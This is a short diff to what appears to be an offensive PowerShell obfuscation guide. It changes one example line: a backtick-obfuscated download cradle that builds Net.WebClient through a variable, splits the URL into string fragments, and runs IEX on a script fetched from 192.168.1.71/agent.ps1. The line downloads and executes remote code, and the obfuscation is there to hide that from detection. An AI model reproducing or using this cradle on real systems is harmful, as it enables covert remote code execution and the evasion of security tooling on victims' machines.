@@ -112,7 +112,7 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 - String obfuscated<br />
 
       $get="N`et.Web`Cli`ent"
-      powershell.exe I`EX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
+      powershell.exe IEX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
 - Using an **batch** local variable inside the **powershell interpreter**
 
